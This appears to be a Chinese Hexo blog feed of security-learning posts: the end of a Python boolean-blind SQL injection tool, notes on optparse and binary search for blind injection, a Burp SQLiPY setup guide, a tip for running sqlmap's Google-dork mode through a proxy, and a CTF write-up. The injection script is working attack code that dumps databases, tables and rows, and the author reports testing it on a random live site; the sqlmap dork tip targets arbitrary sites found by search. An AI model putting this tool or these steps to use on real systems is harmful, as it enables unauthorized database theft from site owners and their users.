class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatanum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from %s.%s)=%s-- "</span>%(url,dbname,tablename,str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span>       </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpdatas</span><span class="params">(url,basehtml,num,columnname,tablename,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(%s) from %s.%s limit %s,1)=%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testurl</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    url1=<span class="string">"%s'"</span>%(url)</div><div class="line">    url2=<span class="string">'%s"'</span>%(url)</div><div class="line">    html1=requests.get(url1).content</div><div class="line">    html2=requests.get(url2).content</div><div class="line">    <span class="keyword">if</span> basehtml!=html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type numeric"</span></div><div class="line">        <span class="keyword">return</span> url</div><div class="line">    <span class="keyword">elif</span> basehtml!=html1 <span class="keyword">and</span> basehtml==html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url1</div><div class="line">    <span class="keyword">elif</span> basehtml==html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser=OptionParser()</div><div class="line">    parser.add_option(<span class="string">"-u"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"-u url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-C"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"-C column1,column2,...,..."</span>)</div><div class="line">    parser.add_option(<span class="string">"-T"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"-T table"</span>)</div><div class="line">    parser.add_option(<span class="string">"-D"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"db"</span>,help=<span class="string">"-D dadabase"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dbs"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dbs"</span>,help=<span class="string">"inject all databases"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dump"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dump"</span>,help=<span class="string">"dump columns with selected table and database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--tables"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"tables"</span>,help=<span class="string">"inject all tables in selected database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--columns"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"columns"</span>,help=<span class="string">"inject all columns in selected table and database"</span>)</div><div class="line">    (options,args)=parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url <span class="keyword">and</span> len(sys.argv)==<span class="number">3</span>:</div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        result=testurl(url,basehtml)</div><div class="line">        <span class="keyword">if</span> result:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe injectable"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe notinjectable"</span></div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dbs:<span class="comment">#--dbs</span></div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdbnum(url,basehtml)</div><div class="line">        getdbs(url,basehtml,num)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.tables <span class="keyword">and</span> options.db:<span class="comment">#-u url --tables -D database</span></div><div class="line">        url=options.url</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=gettablenum(url,basehtml,db)</div><div class="line">        gettables(url,basehtml,num,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.columns <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --columns -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getcolumnnum(url,basehtml,table,db)</div><div class="line">        getcolumns(url,basehtml,num,table,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dump <span class="keyword">and</span> options.column <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --dump  -C column -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        column=options.column</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        columns=column.split(<span class="string">","</span>)</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdatanum(url,basehtml,table,db)</div><div class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> columns:</div><div class="line">            dumpdatas(url,basehtml,num,column,table,db)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#print "Please look this script help information,to use --help or -h"</span></div><div class="line">        parser.print_help()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p><p><strong>使用方法，自己使用optparse库将脚本参数设置成了类似于sqlmap的参数，下面是该脚本使用方法</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180605/mikhegHaae.png?imageslim" alt="mark"><br><strong>随便测试网上一个注入点来测试写的工具是否可以使用，可以看到成功注入出来了数据库，当然经过测试也能注入出表字段和数据库内容，这个工具只是初步完成了，当然还有很多的不足，这些都需要自己不断的去完善</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180605/KeIKGl7bmG.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;a href=&quot;#python编程实现自动化注入之布尔盲注&quot; class=&quot;headerlink&quot; title=&quot;python编程实现自动化注入之布尔盲注&quot;&gt;&lt;/a&gt;python编程实现自动化注入之布尔盲注&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python optparse模块使用总结</title>
    <link href="http://yoursite.com/2018/06/05/pyoptparse/"/>
    <id>http://yoursite.com/2018/06/05/pyoptparse/</id>
    <published>2018-06-04T16:08:28.330Z</published>
    <updated>2018-06-04T17:13:29.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python-optparse模块使用总结"><a href="#python-optparse模块使用总结" class="headerlink" title="python optparse模块使用总结"></a>python optparse模块使用总结</h1><p><strong>之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节</strong><br><a id="more"></a></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>首先需要导入optparse模块中的OptionParser类，这个类里面有设置和解析命令行参数的方法，然后创建它的一个实例</strong></p><pre><code>from optparse import OptionParserparser = OptionParser()</code></pre><p><strong>调用该类的add_option方法设置命令行参数</strong></p><pre><code>parser.add_option(&quot;-自定义的参数识别标签&quot;,&quot;--自定义的参数识别标签&quot;,action=&quot;store/store_true/store_false&quot;,type=&quot;string/...&quot;,dest=&quot;&quot; help=&quot;&quot;)</code></pre><p><strong>该函数里面比较重要的几个参数的用法</strong></p><pre><code>首先是第一和第二个参数作为调用时的参数的标签，会被识别action参数：action参数告诉optparse当它在命令行中遇到选项时该做什么。action有三种存储方式：store、store_false、store_true。如果不指定action的值，默认的是store，store需要在命令行中，标签后跟上参数，并将该命令行参数的值赋值给dest参数中指定的变量。如果action值为store_true，那么在命令行中，参数的标签后不需要跟参数，如果命令行中使用了该参数标签，那么该命令行参数的dest变量的值会为True，store_flase同样不需要指定参数，不过不同的是，指定为store_false的参数标签，其dest的值在标签设置时会被设为Falsetype参数type指定dest参数中设置的变量的存储类型，默认为stringdest参数里面的值为变量名，当action被设置为store时，该变量用户接受参数标签后的参数值help参数设置要显示的参数的帮助信息</code></pre><p><strong>设置完命令行参数后需要解析命令行参数，使用该类的parse_args方法</strong></p><pre><code>(options, args) = parser.parse_args()</code></pre><p><strong>该方法会返回两个对象，options为字典类型，里面存放了dest中设置的变量和其对应的命令行参数值，args为列表类型，里面存放多余的命令行参数，一个参数标签后只能跟一个参数，多余的会被存在args中</strong></p><p><strong>在python中使用命令行中的参数，解析完了命令行参数，就可以在python中直接调用了，调用方法</strong></p><pre><code>options.dest中设置的变量名</code></pre><p><strong>通过这种方式就能取到命令行中的参数值了</strong></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p><strong>为了更深的理解，给出几个实例</strong></p><p><strong>实例1.action的值为store默认值：</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;-u&quot;,&quot;--url&quot;,action=&quot;store&quot;,type=&quot;string&quot;,dest=&quot;url&quot;,help=&quot;-u/--url url&quot;)&lt;Option at 0x268ce88: -u/--url&gt;&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help         show this help message and exit    -u URL, --url=URL  -u/--url url&gt;&gt;&gt; args=[&quot;-u&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; print options.url&gt;&gt;&gt; inputurl1&gt;&gt;&gt; args=[&quot;--url&quot;,&quot;inputurl1&quot;,&quot;inputurl2&quot;,&quot;inputurl2&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: &apos;inputurl1&apos;},[&apos;inputurl2&apos;, &apos;inputurl2&apos;]&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;url&apos;: None},[]&gt;&gt;&gt;</code></pre><p><strong>实例2.action的值为store_true</strong></p><pre><code>&gt;&gt;&gt; from optparse import OptionParser&gt;&gt;&gt; parser=OptionParser()&gt;&gt;&gt; parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,dest=&quot;dbs&quot;,help=&quot;--dbs&quot;)&lt;Option at 0x2316048: --dbs&gt;&gt;&gt;&gt; args=[&quot;--dbs&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: True},[]&gt;&gt;&gt; print options.dbsTrue&gt;&gt;&gt; args=[]&gt;&gt;&gt; (options,args)=parser.parse_args(args)&gt;&gt;&gt; print &quot;%s,%s&quot;%(options,args){&apos;dbs&apos;: None},[]&gt;&gt;&gt; print options.dbsNone&gt;&gt;&gt; args=[&quot;-h&quot;]&gt;&gt;&gt; (options,args)=parser.parse_args(args)Usage:  [options]Options:    -h, --help  show this help message and exit    --dbs       --dbsG:\代码&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python-optparse模块使用总结&quot;&gt;&lt;a href=&quot;#python-optparse模块使用总结&quot; class=&quot;headerlink&quot; title=&quot;python optparse模块使用总结&quot;&gt;&lt;/a&gt;python optparse模块使用总结&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;之前用过的一个python库，可以实现解析命令行参数实现命令行交互，最近再写自动化sql注入工具需要实现命令行交互的功能，由于好久不写，可多细节方面都想不起来了，又重新温习了一下这个库，在这里记录一下使用方法和一些容易被忽视的细节&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python有序二分查找算法</title>
    <link href="http://yoursite.com/2018/06/04/pybinarysearch/"/>
    <id>http://yoursite.com/2018/06/04/pybinarysearch/</id>
    <published>2018-06-04T15:35:01.833Z</published>
    <updated>2018-06-05T09:08:57.495Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python有序二分查找算法"><a href="#python有序二分查找算法" class="headerlink" title="python有序二分查找算法"></a>python有序二分查找算法</h1><p><strong>感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀</strong></p><p><strong>记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求</strong><br><a id="more"></a></p><h3 id="二分查找算法代码"><a href="#二分查找算法代码" class="headerlink" title="二分查找算法代码"></a>二分查找算法代码</h3><p><strong>首先需要给定一个查找的范围，也就是区域。其次要求被查找的列表是有序的，贴出代码</strong></p><pre><code>#coding=utf-8def binary_search(sealist,find):    low=0    high=len(sealist)    while low&lt;=high:        mid=(low+high)/2        if find==sealist[mid]:            return mid        elif find&lt;sealist[mid]:            high=mid-1        elif find&gt;sealist[mid]:            low=mid+1        else:            return -1sealist=range(0,1000)find=input(&quot;please input a number:&quot;)result=binary_search(sealist,find)if result&gt;=0:    print &quot;Catch Element %s!    Position:%s!&quot;%(str(find),str(result+1))else:    print &quot;Sorry,The Element Not Found.&quot;</code></pre><p><strong>利用二分法通过不断地缩小查找区域最终锁定查找的内容，二分法相比于普通的循环自增查找，查找次数减少了很多，速度自然提升了不少。举个例子，如果采用自增查找的方式，在0-1000列表中查找到100的位置需要101次，但是上面的代码利用了有序二分查找到100的位置只需要7次</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180604/0F8j4m5mfK.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python有序二分查找算法&quot;&gt;&lt;a href=&quot;#python有序二分查找算法&quot; class=&quot;headerlink&quot; title=&quot;python有序二分查找算法&quot;&gt;&lt;/a&gt;python有序二分查找算法&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;感觉自己的博客更新的很慢，看到自己博客不更新文章的话总会很焦虑，因为总想写点有意义的技术文章，但是想了想，博客本来就是一个记录知识的地方，将自己学习的过程记录下来也是个不错的选择，即使是一个小知识点也值得记录，以便以后不会忘记，所以以后博客的更新次数应该会很频繁，博客的日志是时候该充实一下了。写给自己，迷茫的时候多研究点知识，多写博客总结，知识需要不断沉淀&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;记录一个用python写SQL盲注脚本时需要用到的一个算法，在使用盲注的技术去判断数据库的内容时，使用二分法可以加快查找速度，相比于自加的判断可以减少所发送的http请求&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="算法" scheme="http://yoursite.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite中配置使用sqlmapapi</title>
    <link href="http://yoursite.com/2018/06/03/BurpSQLiPY/"/>
    <id>http://yoursite.com/2018/06/03/BurpSQLiPY/</id>
    <published>2018-06-03T09:43:56.948Z</published>
    <updated>2018-06-03T13:03:49.030Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burpsuite中配置使用sqlmapapi"><a href="#burpsuite中配置使用sqlmapapi" class="headerlink" title="burpsuite中配置使用sqlmapapi"></a>burpsuite中配置使用sqlmapapi</h1><p><strong>burpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为<code>SQLiPY</code>的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下</strong><br><a id="more"></a></p><h3 id="SQLiPY插件安装"><a href="#SQLiPY插件安装" class="headerlink" title="SQLiPY插件安装"></a>SQLiPY插件安装</h3><p><strong>打开burpsuite,在Extender模块中的BApp Store中找到SQLiPY插件</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/GjeAJ3i0KF.png?imageslim" alt="mark"><br><strong>可以看到安装该插件需要的环境</strong></p><pre><code>Jython 2.7.0 or newerJava 1.7 or 1.8 (the beta version of Jython 2.7 requires this).Python 2 (already installed on most Unix distributions)</code></pre><p><strong>java和python环境都有了，还需要Jython2.7.0或者更新的，去<a href="http://www.jython.org/downloads.html" title="Jython官网" target="_blank" rel="external">Jython官网</a>下载一个jar包即可</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/L73Lejlcak.png?imageslim" alt="mark"><br><strong>可以看到关于Jython2.7.0版本官网上有两个地方可以下载，第一个jar需要安装，英文意思是<code>安装可以执行jar的jython</code>，但是自己安装后在burpsuite中导入jython.jar去安装<code>SQLiPY</code>后会报出<code>Cannot create PyString with non-byte value</code>的错误，也就是SQLiPY插件虽然下载成功但是无法导入进burpsuite，问了很多同学，有的人安装完成导入后并不会报错，但是有的人就是会报错，我就属于会报错的那种，解决方案也很简单注意在这下载第二个jar包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/b3517eB6h1.png?imageslim" alt="mark"><br><strong>英文意思是<code>在java应用程序中嵌入Jython</code>,这个jar包不需要安装，直接导入即可，在Extender模块中的Options中的<code>Python Environment</code>中，可以将下载的jar包导入到burpsuite中</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/KGa1HA8fm7.png?imageslim" alt="mark"><br><strong>然后就可以在BApp Store安装<code>SQLiPY</code>这个插件了，安装过程比较久，但是可以安装成功，注意安装的<code>SQLiPY.py</code>会默认在计算机的用户目录下，所以目录名里不能有中文和引号等字符，不然会在burpsuite导入<code>SQLiPY</code>插件时出现java报错，之前我的计算机用户里面有个引号就加载不进来，所以这一点要十分注意</strong></p><h3 id="SQLiPY插件的使用"><a href="#SQLiPY插件的使用" class="headerlink" title="SQLiPY插件的使用"></a>SQLiPY插件的使用</h3><p><strong>这个插件确实很强大方便，可以在渗透测试的时候直接在burpsuite中通过sqlmapapi使用sqlmap</strong></p><p><strong>首先在该插件下选择python.exe</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/9ddgAG0HJd.png?imageslim" alt="mark"><br><strong>之后点击<code>Start API</code>就可以启动API使用这个插件了，用burpsuite抓包时看到一个可能存在注入的参数，可以右键SQLiPY Scan直接将数据包发给SQLiPY插件，使用sqlmap去测试该注入点</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/l55g8GG4gA.png?imageslim" alt="mark"><br><strong>如果存在注入，就会在Scanner模块中显示出来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180603/C1FaE583H6.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;burpsuite中配置使用sqlmapapi&quot;&gt;&lt;a href=&quot;#burpsuite中配置使用sqlmapapi&quot; class=&quot;headerlink&quot; title=&quot;burpsuite中配置使用sqlmapapi&quot;&gt;&lt;/a&gt;burpsuite中配置使用sqlmapapi&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;burpsuite的Extender中有很多有用的扩展插件可以方便安全人员渗透测试，其中一个名为&lt;code&gt;SQLiPY&lt;/code&gt;的插件可以直接在burpsuite中调用sqlmapapi进行测试，自己在安装这个插件的时候遇到了很多坑，属于那种百度谷歌都查不出解决方案的问题。最终终于捣腾出来了，在这记录一下&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="burpsuite" scheme="http://yoursite.com/tags/burpsuite/"/>
    
  </entry>
  
  <entry>
    <title>解决sqlmap不能使用-g的问题</title>
    <link href="http://yoursite.com/2018/06/02/sqlmapgsearch/"/>
    <id>http://yoursite.com/2018/06/02/sqlmapgsearch/</id>
    <published>2018-06-02T03:33:04.780Z</published>
    <updated>2018-06-04T15:14:02.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决sqlmap不能使用-g的问题"><a href="#解决sqlmap不能使用-g的问题" class="headerlink" title="解决sqlmap不能使用-g的问题"></a>解决sqlmap不能使用-g的问题</h1><p><strong>sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入</strong></p><p><strong>之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里</strong><br><a id="more"></a><br><strong>可以看到<code>sqlmap -g</code>不能使用</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180602/KJbgc22Eae.png?imageslim" alt="mark"></p><p><strong>我的ss客户端为本地1088端口，使用<code>sqlmap -g</code>时指定本地的ss端口作为代理即可</strong></p><pre><code>sqlmap -g &quot;inurl:php?id=&quot; --proxy &quot;http://127.0.0.1:1088&quot;</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180602/I3jKBLa24e.png?imageslim" alt="mark"><br><strong>可以看到此时sqlmap的谷歌语法搜索注入点便可以使用了。这是sqlmap的一个很强大的功能</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;解决sqlmap不能使用-g的问题&quot;&gt;&lt;a href=&quot;#解决sqlmap不能使用-g的问题&quot; class=&quot;headerlink&quot; title=&quot;解决sqlmap不能使用-g的问题&quot;&gt;&lt;/a&gt;解决sqlmap不能使用-g的问题&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sqlmap的-g参数的功能可以自动的使用google语法搜索注入点进行注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;之前使用赛风vpn时sqlmap的-g是可以用的，但是由于之后换成了shadowsocks后发现-g功能不能用了，百度谷歌都没有搜到这个问题的解决办法，将我的结果方案写到这里&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="工具使用" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
    
      <category term="sqlmap" scheme="http://yoursite.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2018 write up</title>
    <link href="http://yoursite.com/2018/05/25/iscc2018/"/>
    <id>http://yoursite.com/2018/05/25/iscc2018/</id>
    <published>2018-05-25T12:04:18.581Z</published>
    <updated>2018-06-04T15:04:26.787Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ISCC2018-write-up"><a href="#ISCC2018-write-up" class="headerlink" title="ISCC2018 write up"></a>ISCC2018 write up</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>参加2018年的ISCC竞赛，将做出的题记录到这里,记录一下思路，沉淀一下</strong><br><a id="more"></a></p><h2 id="Web方向"><a href="#Web方向" class="headerlink" title="Web方向"></a>Web方向</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p><strong>HINT：只要比服务器上的数字大就好了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/k890aKHIcH.png?imageslim" alt="mark"><br><strong>发现题目只有一个输入框，限制只能输入3个字符，于是firebug查看元素，发现maxlength值为3，将3改为100，随意输入个大数字，flag就出来了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/KB7LcgEd58.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/9FAh3mK44g.png?imageslim" alt="mark"><br><code>flag:key is 768HKyu678567&amp;*&amp;K</code></p><h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p><strong>HINT：小明扫描了他心爱的小红的电脑，发现开放了一个8013端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的8013端口到底隐藏着什么秘密(key)？（签到题）</strong></p><p><strong>该题为web的签到题，打开后发现是这样的</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/aKd6GiJf4J.png?imageslim" alt="mark"><br><strong>必须从本地访问，于是想到了伪造X-Forwarded-For，后来发现直接访问源代码就能得到flag，果然是签到题啊</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/I3BaAJJmlC.png?imageslim" alt="mark"><br><code>flag:ISCC{^&amp;*(UIHKJjkadshf}</code></p><h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p><strong>HINT:如果你对xss了解的话,那你一定知道key是什么了，加油！</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/h75EeL54G5.png?imageslim" alt="mark"><br><strong>看到xss便首先尝试在输入框里提交XSSPaylaod，结果发现根本找不到输出点，不管提交多少次都是”加油再试一次”，然后发现页面有一串字符非常像base64编码</strong><br><code>ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0</code><br><strong>base64解码了一下，发现是XSSpayload，里面有我们要的key</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/2bJ3AL2hc5.png?imageslim" alt="mark"><br><strong>因为key的16进制中有00，代表结束符（截断），所以要将key中的00字符都删掉，才能将key复制下来</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/IKHk1diJmC.png?imageslim" alt="mark"><br><strong>key:/%nsfocusXSStest%/</strong></p><p><strong>key不是flag，将<code>/%nsfocusXSStest%/</code>提交到页面输入框才能弹出来flag</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180503/Je6hfIh43H.png?imageslim" alt="mark"><br><strong>建议出题人将这题放到杂项会比较合适，有点挂羊头卖狗肉的意思</strong></p><p><code>flag{Hell0World}</code></p><h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" 